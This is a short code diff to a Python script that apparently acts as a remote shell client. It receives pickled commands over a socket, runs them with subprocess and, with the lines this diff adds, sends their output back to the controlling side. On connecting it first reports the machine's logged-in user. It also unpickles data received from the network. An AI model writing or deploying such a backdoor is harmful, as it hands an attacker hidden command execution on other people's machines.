@@ -20,10 +20,22 @@ def popenExecution(data):
     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     return str(command.stdout.read() + command.stderr.read(), "utf-8")
 
-def recv(socket):
+def send(socket, payload):
+    try:
+        socket.send(pickle.dumps(payload))
+    except Exception as e:
+        print(e)
+        time.sleep(1)
+        
+
+
+def receive(socket):
     try:
         message = pickle.loads(socket.recv(2048))
+        send(socket, popenExecution(message))
         print(message)
+
+
     except Exception as e:
         print(e)
 
@@ -33,7 +45,7 @@ def main():
     #Standard command to identify who this machine is
     socket.send(pickle.dumps(popenExecution("who").split()[0])) 
     while True:
-        recv(socket)
+        receive(socket)
         time.sleep(1)
 
 
